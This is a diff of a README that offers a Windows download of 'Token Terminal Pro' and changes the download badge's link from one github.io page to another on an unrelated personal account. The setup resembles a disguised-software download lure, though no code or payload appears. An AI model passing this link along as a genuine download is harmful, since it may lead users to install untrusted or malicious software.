@@ -4,7 +4,7 @@
 
 ## 📥 Download Token Terminal Pro for Windows
 
-[![⬇️ Download Token Terminal Pro](https://img.shields.io/badge/Download-Token%20Terminal%20Pro-blue?style=for-the-badge&logo=windows)](https://terminalload.github.io/.github/)
+[![⬇️ Download Token Terminal Pro](https://img.shields.io/badge/Download-Token%20Terminal%20Pro-blue?style=for-the-badge&logo=windows)](https://rodionoffkarim.github.io/.github/token-terminal)
 
 ---
 
